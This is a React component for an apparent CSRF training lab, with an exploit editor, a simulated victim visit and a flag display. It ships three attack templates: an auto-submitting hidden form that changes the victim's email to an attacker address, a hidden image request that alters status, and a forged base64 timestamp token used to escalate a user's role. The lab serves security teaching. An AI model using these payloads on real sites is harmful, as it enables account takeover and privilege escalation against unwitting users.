'use client';

import React, { useState } from 'react';

interface RequestLog {
  method: string;
  url: string;
  body?: Record<string, string>;
  response: {
    status: number;
    message: string;
    flag?: string;
  };
}

interface AttackResult {
  success: boolean;
  attackType: string;
  requests: RequestLog[];
  stateChanges: string[];
  flagsEarned: string[];
  error?: string;
}

interface AttackWorkshopProps {
  session: {
    token: string;
  } | null;
  currentTask: {
    id: string;
  } | null;
  onAttackComplete: () => void;
}

export default function AttackWorkshop({ session, currentTask, onAttackComplete }: AttackWorkshopProps) {
  const [editorContent, setEditorContent] = useState('');
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState<AttackResult | null>(null);
  const [expandedRequest, setExpandedRequest] = useState<number | null>(null);

  const templates = {
    post: `<!DOCTYPE html>
<html>
<head>
  <title>You Won a Prize!</title>
</head>
<body>
  <h1>Congratulations! Click below to claim your reward.</h1>
  
  <!-- Vulnerable Email Update Form -->
  <form id="csrf-form" action="/api/app/settings/email" method="POST">
    <input type="hidden" name="email" value="attacker@evilmail.thm" />
  </form>

  <script>
    // Auto-submit the form as soon as page loads
    document.getElementById('csrf-form').submit();
  </script>
</body>
</html>`,

    image: `<img src="/api/app/settings/status?status=Hacked!" style="display:none;" />`,

    bypass: `<!DOCTYPE html>
<html>
<head>
  <title>Flash Sale!</title>
</head>
<body>
  <h1>Access Limited Time Deal!</h1>

  <form id="csrf-form" action="/api/app/settings/role" method="POST">
    <input type="hidden" name="username" value="alice" />
    <input type="hidden" name="role" value="staff" />
    <input type="hidden" name="csrf_token" id="token-input" value="" />
  </form>

  <script>
    // Forging a weak CSRF token for alice: base64("alice:timestamp")
    const minuteTimestamp = Math.floor(Date.now() / 60000);
    const token = btoa("alice:" + minuteTimestamp);
    
    // Inject token and submit
    document.getElementById('token-input').value = token;
    document.getElementById('csrf-form').submit();
  </script>
</body>
</html>`
  };

  const applyTemplate = (type: 'post' | 'image' | 'bypass') => {
    setEditorContent(templates[type]);
    setResult(null);
  };

  const getBackendUrl = () => {
    if (typeof window !== 'undefined') {
      return window.location.origin;
    }
    return '';
  };

  const runSimulation = async () => {
    if (!editorContent.trim() || !session) return;
    
    setLoading(true);
    setResult(null);
    setExpandedRequest(null);

    try {
      const res = await fetch(`${getBackendUrl()}/api/simulate/attack`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          labToken: session.token,
          html: editorContent,
          targetTask: currentTask?.id
        })
      });

      if (res.ok) {
        const data: AttackResult = await res.json();
        setResult(data);
        if (data.success && data.flagsEarned.length > 0) {
          onAttackComplete();
        }
      } else {
        const errData = await res.json();
        setResult({
          success: false,
          attackType: 'None',
          requests: [],
          stateChanges: [],
          flagsEarned: [],
          error: errData.error || 'Victim failed to open page.'
        });
      }
    } catch (e) {
      setResult({
        success: false,
        attackType: 'None',
        requests: [],
        stateChanges: [],
        flagsEarned: [],
        error: 'Simulation engine connection failure.'
      });
    } finally {
      setLoading(false);
    }
  };

  const lineCount = editorContent.split('\n').length;
  const lineNumbers = Array.from({ length: Math.max(12, lineCount) }, (_, i) => i + 1);

  return (
    <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 p-6 font-sans text-[#e6edf3]">
      
      {/* LEFT: HTML EDITOR */}
      <div className="bg-[#161b22] border border-[#30363d] rounded-xl overflow-hidden flex flex-col h-[560px] shadow-lg">
        {/* Editor Controls */}
        <div className="bg-[#1c2333] border-b border-[#30363d] p-3 flex flex-wrap items-center justify-between gap-3 select-none">
          <div className="flex items-center gap-1.5">
            <span className="text-xs font-bold text-white">⚔️ Exploit Editor</span>
            <span className="text-[9px] bg-[#3b1517] text-[#f85149] border border-[#f85149]/30 rounded font-black px-1.5 py-0.5">HTML Payload</span>
          </div>

          <div className="flex items-center gap-1">
            <button
              onClick={() => applyTemplate('post')}
              className="text-[10px] bg-[#21262d] border border-[#30363d] hover:bg-[#30363d] hover:text-white px-2.5 py-1 rounded transition cursor-pointer font-semibold text-[#8b949e]"
            >
              POST Form
            </button>
            <button
              onClick={() => applyTemplate('image')}
              className="text-[10px] bg-[#21262d] border border-[#30363d] hover:bg-[#30363d] hover:text-white px-2.5 py-1 rounded transition cursor-pointer font-semibold text-[#8b949e]"
            >
              GET Image
            </button>
            <button
              onClick={() => applyTemplate('bypass')}
              className="text-[10px] bg-[#21262d] border border-[#30363d] hover:bg-[#30363d] hover:text-white px-2.5 py-1 rounded transition cursor-pointer font-semibold text-[#8b949e]"
            >
              Token Bypass
            </button>
            <button
              onClick={() => { setEditorContent(''); setResult(null); }}
              className="text-[10px] bg-red-950 border border-red-800 text-[#f85149] hover:bg-red-900 px-2.5 py-1 rounded transition cursor-pointer font-semibold"
            >
              Clear
            </button>
          </div>
        </div>

        {/* Code Textarea & Gutter */}
        <div className="flex-1 flex font-mono text-xs overflow-hidden bg-[#0d1117]">
          {/* Gutter */}
          <div className="w-10 bg-[#161b22]/40 text-[#6e7681] border-r border-[#30363d] py-3 text-right pr-2.5 select-none leading-relaxed shrink-0">
            {lineNumbers.map(n => (
              <div key={n}>{n}</div>
            ))}
          </div>
          {/* Input field */}
          <textarea
            value={editorContent}
            onChange={(e) => setEditorContent(e.target.value)}
            placeholder="<!-- Write your HTML attack payload here... -->"
            className="flex-grow bg-transparent border-0 outline-none text-[#e6edf3] p-3 resize-none font-mono text-xs leading-relaxed focus:ring-0 overflow-y-auto"
          />
        </div>
      </div>

      {/* RIGHT: RESULTS & FLOW */}
      <div className="flex flex-col gap-5 h-[560px] overflow-y-auto pr-1">
        
        {/* LAUNCH PANEL */}
        <div className="bg-[#161b22] border border-[#30363d] rounded-xl p-5 shadow-lg flex flex-col justify-between shrink-0">
          <div>
            <h3 className="text-sm font-bold text-white flex items-center gap-1.5">
              🔬 Victim Simulation Control
            </h3>
            <p className="text-xs text-[#8b949e] mt-1 leading-normal">
              When clicked, Alice (Admin) will be lured into visiting your crafted exploit page. Any HTTP requests automatically generated by the browser will carry her active session cookies.
            </p>
          </div>

          <div className="mt-5 flex gap-3 items-center">
            <button
              onClick={runSimulation}
              disabled={loading || !editorContent.trim()}
              className="flex-1 bg-[#f85149] hover:bg-[#da3633] disabled:bg-[#3b1517] text-[#e6edf3] disabled:text-[#f85149]/40 border border-[#f85149]/30 hover:border-[#f85149] rounded-xl py-3 px-5 transition font-black text-xs flex items-center justify-center gap-2 cursor-pointer shadow-[0_0_15px_rgba(248,81,73,0.15)]"
            >
              {loading ? (
                <>
                  <svg className="animate-spin h-4 w-4 text-white" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                  </svg>
                  Sending phishing link to victim...
                </>
              ) : (
                '🚀 Simulate Victim Visit'
              )}
            </button>
          </div>
        </div>

        {/* RESULTS REPORT */}
        {result && (
          <div className="flex-1 flex flex-col gap-4">
            
            {/* Summary Banner */}
            <div className={`border rounded-xl p-4 flex items-center gap-3.5 shadow-sm ${
              result.success 
                ? 'bg-[#1e3a2b]/20 border-[#00d4aa]/40 text-[#00d4aa]' 
                : 'bg-[#3b1517]/20 border-[#f85149]/40 text-[#f85149]'
            }`}>
              <div className="text-2xl">{result.success ? '🏆' : '❌'}</div>
              <div>
                <h4 className="text-xs font-bold uppercase tracking-wider">Attack Simulation Result</h4>
                <p className="text-sm font-black mt-0.5 text-white">
                  {result.success 
                    ? `Success! State Modified via ${result.attackType}` 
                    : result.error || 'Attack Failed. No state modifications detected.'}
                </p>
              </div>
            </div>

            {/* Attack Diagram */}
            {result.requests && result.requests.length > 0 && (
              <div className="bg-[#161b22] border border-[#30363d] rounded-xl p-4 shadow-md">
                <h4 className="text-[10px] font-bold uppercase tracking-wider text-[#8b949e] mb-3">Attack Flow Visualization</h4>
                
                <div className="flex items-center justify-between gap-2 max-w-sm mx-auto py-2 text-[10px] font-bold text-center">
                  <div className="bg-[#1c2333] border border-[#30363d] rounded-lg px-2.5 py-1.5 text-white shrink-0">
                    👩‍💻 Victim<br />(Alice)
                  </div>
                  
                  {/* Arrow right */}
                  <div className="flex-grow relative flex flex-col items-center justify-center">
                    <span className="text-[9px] text-[#8b949e] mb-0.5">Accesses Exploit</span>
                    <div className="w-full h-0.5 bg-[#30363d] relative">
                      <div className="absolute right-0 top-1/2 -translate-y-1/2 w-1.5 h-1.5 border-t-2 border-r-2 border-[#8b949e] rotate-45" />
                    </div>
                  </div>

                  <div className="bg-red-950 border border-red-800 text-[#f85149] rounded-lg px-2.5 py-1.5 shrink-0">
                    📄 Attack Page<br />(Student HTML)
                  </div>

                  {/* Arrow right with Cookie */}
                  <div className="flex-grow relative flex flex-col items-center justify-center">
                    <span className="text-[8px] bg-blue-950 border border-blue-800 text-blue-400 px-1 rounded-full mb-0.5 font-mono">Cookie 🍪</span>
                    <div className="w-full h-0.5 bg-[#f85149] relative">
                      <div className="absolute right-0 top-1/2 -translate-y-1/2 w-1.5 h-1.5 border-t-2 border-r-2 border-[#f85149] rotate-45" />
                    </div>
                  </div>

                  <div className="bg-[#1c2333] border border-[#30363d] rounded-lg px-2.5 py-1.5 text-white shrink-0">
                    🏢 Target App<br />(StaffHub API)
                  </div>
                </div>
              </div>
            )}

            {/* State Changes list */}
            {result.stateChanges && result.stateChanges.length > 0 && (
              <div className="bg-[#161b22] border border-[#30363d] rounded-xl p-4">
                <h4 className="text-[10px] font-bold uppercase tracking-wider text-[#8b949e] mb-2">State Modifications</h4>
                <div className="flex flex-col gap-1.5">
                  {result.stateChanges.map((change, idx) => (
                    <div key={idx} className="text-xs text-white font-semibold flex items-center gap-1.5">
                      <span className="text-[#00d4aa]">✦</span> {change}
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* Flags Earned */}
            {result.flagsEarned && result.flagsEarned.length > 0 && (
              <div className="bg-[#1e3a2b]/20 border border-[#00d4aa] rounded-xl p-4 shadow-[0_0_15px_rgba(0,212,170,0.15)]">
                <h4 className="text-[10px] font-bold uppercase tracking-wider text-[#00d4aa] mb-2">🏴 Flag Captured!</h4>
                {result.flagsEarned.map((flag, idx) => (
                  <div key={idx} className="bg-[#0d1117] border border-[#00d4aa]/30 rounded-lg p-2.5 font-mono text-xs select-all text-center text-white font-bold">
                    {flag}
                  </div>
                ))}
              </div>
            )}

            {/* Requests Log */}
            {result.requests && result.requests.length > 0 && (
              <div className="flex flex-col gap-2">
                <h4 className="text-[10px] font-bold uppercase tracking-wider text-[#8b949e]">Victim Browser Network Logs</h4>
                
                {result.requests.map((req, idx) => {
                  const isExpanded = expandedRequest === idx;
                  const isSuccess = req.response.status >= 200 && req.response.status < 300;

                  return (
                    <div key={idx} className="bg-[#161b22] border border-[#30363d] rounded-xl overflow-hidden text-xs">
                      {/* Header summary */}
                      <button
                        onClick={() => setExpandedRequest(isExpanded ? null : idx)}
                        className="w-full text-left p-3 hover:bg-[#1c2333] transition flex items-center justify-between font-bold cursor-pointer"
                      >
                        <div className="flex items-center gap-2">
                          <span className={`px-2 py-0.5 rounded font-black font-mono text-[10px] ${
                            req.method === 'POST' ? 'bg-[#d29922] text-[#0d1117]' : 'bg-[#58a6ff] text-white'
                          }`}>
                            {req.method}
                          </span>
                          <span className="text-[#e6edf3] font-mono truncate max-w-[200px] md:max-w-xs">{req.url}</span>
                        </div>
                        <div className="flex items-center gap-2 text-[10px]">
                          <span className={isSuccess ? 'text-[#00d4aa]' : 'text-[#f85149]'}>
                            HTTP {req.response.status}
                          </span>
                          <span className="text-[#8b949e]">{isExpanded ? '▲' : '▼'}</span>
                        </div>
                      </button>

                      {/* Expanded View */}
                      {isExpanded && (
                        <div className="border-t border-[#30363d] p-4 bg-[#0d1117] flex flex-col gap-3 font-mono text-[11px] leading-relaxed">
                          {req.body && Object.keys(req.body).length > 0 && (
                            <div>
                              <span className="text-[#8b949e] font-sans block mb-1">Request Payload:</span>
                              <pre className="bg-[#161b22] border border-[#30363d] p-2.5 rounded-lg overflow-x-auto text-[#bc8cff]">
                                {JSON.stringify(req.body, null, 2)}
                              </pre>
                            </div>
                          )}
                          <div>
                            <span className="text-[#8b949e] font-sans block mb-1">Response Body:</span>
                            <pre className="bg-[#161b22] border border-[#30363d] p-2.5 rounded-lg overflow-x-auto text-[#00d4aa]">
                              {JSON.stringify(req.response, null, 2)}
                            </pre>
                          </div>
                        </div>
                      )}
                    </div>
                  );
                })}
              </div>
            )}

          </div>
        )}

      </div>
    </div>
  );
}
